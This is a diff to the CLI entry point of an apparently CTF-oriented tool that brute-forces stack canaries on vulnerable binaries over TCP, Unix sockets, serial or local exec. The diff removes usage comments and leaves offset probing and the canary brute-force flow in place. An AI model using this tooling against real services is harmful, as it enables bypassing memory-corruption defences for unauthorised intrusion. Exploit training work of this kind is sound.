@@ -1,15 +1,3 @@
-"""
-Entry‑point for the canary‑tool package.
-
-Usage examples
---------------
-# Local binary, discover offset, brute‑force canary
-python -m canary_tool.cli --exec ./vuln --auto-offset
-
-# Remote challenge, known offset 264
-python -m canary_tool.cli --tcp host:1337 --offset 264
-"""
-
 from __future__ import annotations
 import argparse, sys, logging
 from typing import Optional
@@ -25,7 +13,6 @@ def build_parser() -> argparse.ArgumentParser:
         description="Brute‑force stack canaries over Unix/TCP/serial/local exec.",
     )
 
-    # ── transport options (exactly one) ─────────────────────────────────────────
     g = p.add_mutually_exclusive_group(required=True)
     g.add_argument("--unix", help="Unix‑domain socket path")
     g.add_argument("--tcp", help="HOST:PORT of remote service")
@@ -36,16 +23,14 @@ def build_parser() -> argparse.ArgumentParser:
         nargs=argparse.REMAINDER,
         help="Local binary and its arguments (use after --exec) e.g. "
         "--exec ./vuln -- -flagA 1",
-    )  # note the double dash
+    )
     g.add_argument("--serial", help="/dev/ttyUSB0[:baud] serial device")
 
-    # ── offset discovery / override ─────────────────────────────────────────────
     p.add_argument(
         "--auto-offset", action="store_true", help="Probe for offset automatically"
     )
     p.add_argument("--offset", type=int, help="Known offset (skips discovery)")
 
-    # ── brute‑force tunables ────────────────────────────────────────────────────
     p.add_argument(
         "--canary-len", type=int, default=8, help="Bytes in canary (default 8)"
     )
@@ -73,18 +58,14 @@ def build_parser() -> argparse.ArgumentParser:
 def main(argv: Optional[list[str]] = None) -> None:
     args = build_parser().parse_args(argv)
 
-    # ── logging level ──────────────────────────────────────────────────────────
     level = logging.WARNING - (10 * args.verbose)  # INFO or DEBUG
     logging.basicConfig(format="%(levelname)s: %(message)s", level=level)
 
-    # ── build target instance ──────────────────────────────────────────────────
     tgt: Target = make_target(args)
     logging.info("Transport ready → %s", tgt)
 
     try:
-        # ── find or trust offset ───────────────────────────────────────────────
         if args.auto_offset:
-            # NB: choose a sensible max_probe; 4096 is safe for most labs
             last_safe, first_crash = find_offset_binary(
                 tgt, max_probe=4096, pad=args.pad.encode("latin1"), timeout=args.timeout
             )
@@ -95,7 +76,6 @@ def main(argv: Optional[list[str]] = None) -> None:
         else:
             sys.exit("ERROR: Either --offset or --auto-offset is required.")
 
-        # ── brute‑force the canary ─────────────────────────────────────────────
         canary = brute_force_canary(
             tgt,
             offset=offset,
